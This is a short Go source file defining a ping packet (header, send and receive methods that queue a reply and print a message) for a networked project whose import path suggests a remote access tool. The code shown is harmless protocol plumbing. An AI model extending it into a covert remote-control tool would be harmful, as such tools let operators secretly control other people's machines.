package main

import (
	"fmt"
	"io"
	"rat/shared/network/header"
)

type PingPacket struct {
}

func (packet PingPacket) Header() header.PacketHeader {
	return header.PingHeader
}

func (packet *PingPacket) Write(io.ReadWriter, *Connection) error {
	fmt.Println("sending ping")
	return nil
}

func (packet PingPacket) Read(w io.ReadWriter, c *Connection) error {
	Queue <- &PingPacket{}
	fmt.Println("recv ping")
	return nil
}
